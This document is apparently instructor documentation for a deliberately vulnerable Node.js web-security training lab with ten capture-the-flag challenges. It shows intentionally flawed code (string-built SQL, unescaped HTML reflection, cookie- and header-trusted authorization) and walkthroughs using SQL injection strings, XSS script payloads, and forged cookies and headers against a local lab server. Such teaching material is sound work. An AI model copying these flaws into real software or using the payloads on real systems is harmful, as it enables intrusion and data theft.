# Dungeon 4: Web — "The Trading Post" Challenge Documentation

The **Trading Post** dungeon is BreachKeep's offensive web application security playground. Students attack a deliberately vulnerable, full-stack Node.js + Express + SQLite e-commerce application demonstrating the **OWASP Top 10** vulnerabilities: information disclosure, response header analysis, insecure client-side state, parameter tampering, Insecure Direct Object References (IDOR), SQL injection (SQLi), Cross-Site Scripting (Reflected & Stored XSS), header forgery, and multi-flaw exploit chaining.

---

## 1. Challenge Architecture & Container Isolation

Every web room spins up a dedicated container running two independent processes separated by UNIX user boundaries:
1. **The Vulnerable Web Application** ([`server.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/web/server.js)):
   - Runs as user `webapp` on port `8080`.
   - Injected with `BK_ROOM=<roomId>` and `BK_FLAG=<student_hmac>`.
   - SQLite in-memory database initialized via [`seed.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/web/seed.js).
2. **The Student Interactive Shell**:
   - Runs as user `student` on port `7681` (`ttyd`).
   - `BK_FLAG` and `BK_ROOM` are completely stripped from its environment (`env -u BK_FLAG -u BK_ROOM`).
   - Because `student` and `webapp` have different UIDs, the student cannot inspect the web application's environment via `/proc/<pid>/environ`.

```
                    +------------------------------------+
                    |  BreachKeep Reverse Proxy (Nginx)  |
                    +-----------------+------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
   /app/<container_name>                                     /labs/<container_name>
   (Proxied to :8080)                                        (Proxied to :7681, WebSocket)
         |                                                         |
         v                                                         v
  +----------------------------------------------------------------------------------+
  | Container: bk_<studentId>_<roomId>                                               |
  |                                                                                  |
  |   +------------------------------------+   +---------------------------------+   |
  |   | Process: node server.js            |   | Process: ttyd bash              |   |
  |   | User:    webapp (uid 1001)         |   | User:    student (uid 1000)     |   |
  |   | Port:    :8080                     |   | Port:    :7681                  |   |
  |   | Env:     BK_ROOM, BK_FLAG          |   | Env:     Stripped (clean)       |   |
  |   +------------------------------------+   +---------------------------------+   |
  +----------------------------------------------------------------------------------+
```

### 1.1 Per-Room Flag Gating ([`bkflag.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/web/bkflag.js))
Because all 10 challenges run variations of the same Trading Post codebase, [`bkflag.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/web/bkflag.js) enforces strict per-room gating:
```javascript
export function reward(room) {
  if (!ROOM || ROOM === room) return FLAG
  return 'BK{wrong-room-keep-looking}'
}
```
If a student in `web-recon` exploits the SQL injection vulnerability, the endpoint returns the decoy flag `BK{wrong-room-keep-looking}`. Only exploiting the designated vulnerability returns the authentic per-student HMAC flag.

---

## 2. Challenge: `web-recon` (Read the Map)

- **Tier**: Mandatory (Room I)
- **Flag Format**: `BK{d1r_bust3r_3num_<16_hex_hmac>}`
- **Vulnerability**: Information Disclosure via `robots.txt`.
- **Target Route**: `GET /robots.txt` & `GET /keep-backup`

### 2.1 Environmental Construction
[`server.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/web/server.js) serves:
```javascript
app.get('/robots.txt', (_req, res) =>
  res.type('text/plain').send('User-agent: *\nDisallow: /portal-8f2c/\nDisallow: /keep-backup/\nDisallow: /keep-admin/'))

app.get('/keep-backup', (_req, res) =>
  res.type('text/plain').send(`internal backup index\n(nothing sensitive here except this) ${reward('recon')}\n`))
```

### 2.2 Skills & Concepts Tested
- Web reconnaissance and endpoint discovery.
- Inspecting crawler directive files (`robots.txt`).
- Understanding that client-side exclusions are public files, not security barriers.

### 2.3 Intended Path of Solving
1. Query `robots.txt`:
   ```bash
   curl -s http://localhost:8080/robots.txt
   ```
   *(Reveals disallowed paths: `/portal-8f2c/`, `/keep-backup/`, `/keep-admin/`)*
2. Request the backup path:
   ```bash
   curl -s http://localhost:8080/keep-backup
   ```
   *(Returns: `internal backup index ... BK{d1r_bust3r_3num_...}`)*
3. Copy and submit the flag.

---

## 3. Challenge: `web-devtools` (It’s in the Headers)

- **Tier**: Mandatory (Room II)
- **Flag Format**: `BK{c0ns0l3_h4ck3r_<16_hex_hmac>}`
- **Vulnerability**: Sensitive Data Exposure in HTTP Response Headers.
- **Target Route**: `GET /account`

### 3.1 Environmental Construction
The endpoint sets a custom HTTP response header containing a Base64-encoded token:
```javascript
app.get('/account', (_req, res) => {
  res.set('X-Keep-Token', Buffer.from(reward('devtools')).toString('base64'))
  res.type('text/plain').send('Account OK. Your session token is returned in the response headers...')
})
```
The page body itself contains zero sensitive data; standard browser viewing renders only the informational message.

### 3.2 Skills & Concepts Tested
- Inspecting HTTP headers using browser Developer Tools (Network tab) or `curl -i`.
- Differentiating between HTTP response headers and response bodies.
- Base64 string decoding.

### 3.3 Intended Path of Solving
1. Request `/account` with response headers displayed:
   ```bash
   curl -i http://localhost:8080/account
   ```
2. Locate the header:
   `X-Keep-Token: Qkt7YzBuczBsM19oNGNrM3JfNDFhMmI0YzZkOGUwZjEyM30=`
3. Decode the token value:
   ```bash
   echo "Qkt7YzBuczBsM19oNGNrM3JfNDFhMmI0YzZkOGUwZjEyM30=" | base64 -d
   ```
   *(Decodes to: `BK{c0ns0l3_h4ck3r_...}`)*
4. Submit the decoded flag.

---

## 4. Challenge: `web-cookie-trust` (The Role Cookie)

- **Tier**: Mandatory (Room III)
- **Flag Format**: `BK{c00k13_m0d1f13r_<16_hex_hmac>}`
- **Vulnerability**: Broken Authorization via Untrusted Client Cookie.
- **Target Route**: `GET /vault`

### 4.1 Environmental Construction
```javascript
app.get('/vault', (req, res) => {
  if (req.cookies.role === 'admin') return res.send(`Welcome, warden. ${reward('cookie-trust')}`)
  res.status(403).send('Members only. (role cookie = user)')
})
```
The server checks `req.cookies.role` without validating a cryptographically signed session token or verifying state against a database session store.

### 4.2 Skills & Concepts Tested
- Cookie manipulation via CLI (`curl --cookie`) or browser DevTools (`document.cookie`).
- Flaws of trusting client-side state for access control decisions.
- Authorization vs. authentication principles.

### 4.3 Intended Path of Solving
1. Request `/vault` normally:
   ```bash
   curl -i http://localhost:8080/vault
   ```
   *(Returns `403 Forbidden: Members only. (role cookie = user)`)*
2. Forge the `role` cookie to `admin`:
   ```bash
   curl --cookie "role=admin" http://localhost:8080/vault
   ```
   *Alternative browser method:*
   Open Console in the web app tab, execute `document.cookie = "role=admin"`, and refresh `/vault`.
3. Output returns: `Welcome, warden. BK{c00k13_m0d1f13r_...}`.

---

## 5. Challenge: `web-client-trust` (Name Your Price)

- **Tier**: Mandatory (Room IV)
- **Flag Format**: `BK{cl13nt_s1d3_byp4ss_<16_hex_hmac>}`
- **Vulnerability**: Parameter Tampering / Insecure Business Logic.
- **Target Route**: `POST /checkout`

### 5.1 Environmental Construction
```javascript
app.post('/checkout', (req, res) => {
  const price = Number(req.body.price)
  if (price <= 0) return res.send(`Free order accepted. ${reward('client-trust')}`)
  res.send(`Charged ${price}.`)
})
```
The application relies on the client to calculate and submit item pricing.

### 5.2 Skills & Concepts Tested
- Modifying HTTP POST body parameters.
- Business logic parameter tampering.
- Principles of server-side data validation.

### 5.3 Intended Path of Solving
1. Submit a checkout request with a tampered non-positive price:
   ```bash
   curl -X POST -d "price=0" http://localhost:8080/checkout
   # OR
   curl -X POST -d "price=-10" http://localhost:8080/checkout
   ```
2. Server responds: `Free order accepted. BK{cl13nt_s1d3_byp4ss_...}`.
3. Submit the flag.

---

## 6. Challenge: `web-idor` (Somebody Else’s Order)

- **Tier**: Mandatory (Room V)
- **Flag Format**: `BK{1d0r_p4r4m_t4mp3r_<16_hex_hmac>}`
- **Vulnerability**: Insecure Direct Object Reference (IDOR).
- **Target Route**: `GET /order?id=<id>`

### 6.1 Environmental Construction
In [`seed.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/web/seed.js):
```javascript
db.prepare('INSERT INTO orders VALUES (1042,?,?,?)').run('alice', 'Widget', 'nothing here')
db.prepare('INSERT INTO orders VALUES (1337,?,?,?)').run('admin', 'Vault Key', reward('idor'))
```
In [`server.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/web/server.js):
```javascript
app.get('/order', (req, res) => {
  const row = db.prepare('SELECT * FROM orders WHERE id = ?').get(req.query.id)
  if (!row) return res.status(404).send('No such order')
  res.send(`Order ${row.id}: ${row.item} — ${row.secret}`)
})
```
The handler directly queries the database using the user-provided query parameter without verifying if the requesting user owns that order.

### 6.2 Skills & Concepts Tested
- Identifying and exploiting IDOR vulnerabilities.
- Parameter enumeration and fuzzing.
- Object-level authorization validation concepts.

### 6.3 Intended Path of Solving
1. Query the default user order:
   ```bash
   curl "http://localhost:8080/order?id=1042"
   ```
   *(Returns: `Order 1042: Widget — nothing here`)*
2. Enumerate alternative numeric order IDs (or test standard privileged identifiers like `1337`):
   ```bash
   curl "http://localhost:8080/order?id=1337"
   ```
3. Server responds: `Order 1337: Vault Key — BK{1d0r_p4r4m_t4mp3r_...}`.
4. Submit the flag.

---

## 7. Challenge: `web-sqli` (The OR Trick)

- **Tier**: Medium (Room VI)
- **Flag Format**: `BK{un10n_s3l3ct_byp4ss_<16_hex_hmac>}`
- **Vulnerability**: Classic SQL Injection (Authentication Bypass).
- **Target Route**: `POST /portal-8f2c/login`

### 7.1 Environmental Construction
```javascript
app.post('/portal-8f2c/login', (req, res) => {
  const { username, password } = req.body
  const q = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
  try {
    const row = db.prepare(q).get()
    if (row) return res.send(`Logged in as ${row.username}. ${reward('sqli')}`)
    res.status(401).send('Bad credentials')
  } catch (e) { res.status(500).send('Query error: ' + e.message) }
})
```
The query is formed through raw string interpolation.

### 7.2 Skills & Concepts Tested
- SQL injection syntax and syntax breaks (`'`, `--`).
- Authentication bypass logic.
- Understanding database query compilation vs. string concatenation.

### 7.3 Intended Path of Solving
1. Craft an injection breaking out of the single quotes and commenting out the password clause:
   `username = admin'--`
   Resulting SQL statement:
   `SELECT * FROM users WHERE username = 'admin'--' AND password = '...'`
2. Submit the payload via `curl`:
   ```bash
   curl -X POST --data-urlencode "username=admin'--" -d "password=x" http://localhost:8080/portal-8f2c/login
   # OR using boolean tautology:
   curl -X POST --data-urlencode "username=' OR '1'='1" -d "password=x" http://localhost:8080/portal-8f2c/login
   ```
3. Server returns: `Logged in as admin. BK{un10n_s3l3ct_byp4ss_...}`.

---

## 8. Challenge: `web-reflected-xss` (Reflected Script)

- **Tier**: Medium (Room VII)
- **Flag Format**: `BK{xss_scr1pt_4l3rt_<16_hex_hmac>}`
- **Vulnerability**: Reflected Cross-Site Scripting (XSS).
- **Target Route**: `GET /search?q=<payload>`

### 8.1 Environmental Construction
- **Reflection**: The search route directly reflects `req.query.q` into the HTML response unescaped:
  ```javascript
  app.get('/search', (req, res) => {
    const q = req.query.q || ''
    res.send(`<h1>Results for ${q}</h1><script>window.KEEP_NONCE=${JSON.stringify(NONCE)}</script>...`)
  })
  ```
- **Execution Verification System**:
  To verify authentic browser JavaScript execution, the page embeds a randomized session nonce (`window.KEEP_NONCE`). A valid XSS payload executes inside the browser, reads `window.KEEP_NONCE`, and triggers a callback to `/xss-report`:
  ```javascript
  app.get('/xss-report', (req, res) => {
    if (req.query.nonce !== NONCE) return res.status(400).send('missing/incorrect nonce')
    if (req.query.r === 'reflected-xss') solved['reflected-xss'] = true
  })
  ```
  Once reported, `GET /xss-status?r=reflected-xss` reveals the flag.

### 8.2 Skills & Concepts Tested
- Reflected XSS vulnerability identification.
- Injecting script tags into raw HTML contexts.
- DOM property extraction and dynamic asynchronous callbacks (`fetch`).

### 8.3 Intended Path of Solving
1. Open the web app in the browser via the "Open web app" button.
2. In the URL address bar, enter the search query with a payload that calls `/xss-report` with the in-page nonce:
   ```text
   http://localhost:8080/search?q=<script>fetch('/xss-report?r=reflected-xss&nonce='+window.KEEP_NONCE)</script>
   ```
3. The browser renders the page, executes the script, and completes the fetch request.
4. Navigate to `/xss-status?r=reflected-xss` or query via CLI:
   ```bash
   curl "http://localhost:8080/xss-status?r=reflected-xss"
   ```
5. Server responds: `solved. BK{xss_scr1pt_4l3rt_...}`.

---

## 9. Challenge: `web-headers` (Forge the Header)

- **Tier**: Medium (Room VIII)
- **Flag Format**: `BK{c0rs_h34d3r_sp00f_<16_hex_hmac>}`
- **Vulnerability**: Header-Based Access Control Trust.
- **Target Route**: `GET /admin-panel`

### 9.1 Environmental Construction
```javascript
app.get('/admin-panel', (req, res) => {
  if ((req.headers['x-keep-role'] || '') === 'admin')
    return res.type('text/plain').send(`admin panel unlocked. ${reward('headers')}`)
  res.status(403).type('text/plain').send('forbidden: this panel requires the header  X-Keep-Role: admin')
})
```

### 9.2 Skills & Concepts Tested
- Adding custom HTTP request headers with `curl -H`.
- Understanding why request headers cannot serve as trusted authorization tokens.

### 9.3 Intended Path of Solving
1. Request `/admin-panel`:
   ```bash
   curl -i http://localhost:8080/admin-panel
   ```
   *(Returns `403 Forbidden` with the required header name)*
2. Provide the specified header:
   ```bash
   curl -H "X-Keep-Role: admin" http://localhost:8080/admin-panel
   ```
3. Server returns: `admin panel unlocked. BK{c0rs_h34d3r_sp00f_...}`.

---

## 10. Challenge: `web-stored-xss` (The Guestbook)

- **Tier**: Hard (Room IX)
- **Flag Format**: `BK{p3rs1st3nt_p4yl04d_<16_hex_hmac>}`
- **Vulnerability**: Stored / Persistent Cross-Site Scripting.
- **Target Route**: `POST /guestbook` & `GET /guestbook`

### 10.1 Environmental Construction
- **Persistence**: Comments posted to `/guestbook` are appended to an in-memory array `guestbook`:
  ```javascript
  app.post('/guestbook', (req, res) => {
    guestbook.push(String(req.body.comment || ''))
    res.redirect('guestbook')
  })
  ```
- **Unescaped Rendering**: When any user visits `GET /guestbook`, the stored comments are rendered directly into the DOM:
  ```javascript
  const items = guestbook.map((c) => `<li>${c}</li>`).join('\n')
  res.send(`<h1>Guestbook</h1><script>window.KEEP_NONCE=${JSON.stringify(NONCE)}</script><ul>${items}</ul>...`)
  ```

### 10.2 Skills & Concepts Tested
- Persistent XSS storage and triggers.
- Multi-stage payload delivery (injecting once, executing upon view).
- DOM-based payload execution.

### 10.3 Intended Path of Solving
1. Submit an XSS payload via HTTP POST to the guestbook:
   ```bash
   curl -X POST -d "comment=<script>fetch('/xss-report?r=stored-xss&nonce='+window.KEEP_NONCE)</script>" http://localhost:8080/guestbook
   ```
2. Open the `/guestbook` page in the browser (or navigate to it in the Web App tab) so the browser loads the stored comment and executes the `<script>` tag.
3. Check the status endpoint:
   ```bash
   curl "http://localhost:8080/xss-status?r=stored-xss"
   ```
4. Server returns: `solved. BK{p3rs1st3nt_p4yl04d_...}`.

---

## 11. Challenge: `web-chain` (Chain It Together)

- **Tier**: Hard (Room X)
- **Flag Format**: `BK{full_ch41n_3xpl01t_<16_hex_hmac>}`
- **Vulnerability**: Exploit Chaining (Reconnaissance + Cookie Tampering).
- **Target Route**: `GET /keep-admin/vault`

### 11.1 Environmental Construction
```javascript
app.get('/keep-admin/vault', (req, res) => {
  if (req.cookies.role === 'admin')
    return res.type('text/plain').send(`chained to the inner vault. ${reward('chain')}`)
  res.status(403).type('text/plain').send('forbidden: admin only (how did the vault room get in?)')
})
```
- Flaw 1: Disclosed endpoint `/keep-admin/` in `robots.txt`.
- Flaw 2: Access requires combining the discovered path with the forged role cookie (`role=admin`).

### 11.2 Skills & Concepts Tested
- Chaining multiple low-severity findings into an authentication/authorization breach.
- Combining path enumeration with session state manipulation.

### 11.3 Intended Path of Solving
1. Perform reconnaissance on `robots.txt`:
   ```bash
   curl -s http://localhost:8080/robots.txt
   ```
   *(Notice `Disallow: /keep-admin/`)*
2. Probe `/keep-admin/`:
   ```bash
   curl -i http://localhost:8080/keep-admin/vault
   ```
   *(Returns `403 Forbidden: admin only`)*
3. Chain the cookie tampering exploit against the hidden administrative endpoint:
   ```bash
   curl --cookie "role=admin" http://localhost:8080/keep-admin/vault
   ```
4. Server returns: `chained to the inner vault. BK{full_ch41n_3xpl01t_...}`.
